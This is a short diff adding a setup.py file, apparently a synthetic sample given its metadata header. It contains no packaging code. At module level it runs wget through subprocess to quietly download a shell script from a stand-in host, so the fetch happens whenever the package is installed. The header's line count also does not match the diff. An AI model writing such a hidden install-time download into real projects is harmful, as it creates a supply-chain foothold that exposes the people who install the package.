@@ -1,0 +1,11 @@
+# path: setup.py
+# lines: 5
+# weight: 35
+# ---
+import subprocess
+DOWNLOADER = "wget"
+
+def fetch(cmd):
+    subprocess.check_call(cmd)
+
+fetch([DOWNLOADER, "-q", "example.invalid/x.sh"])
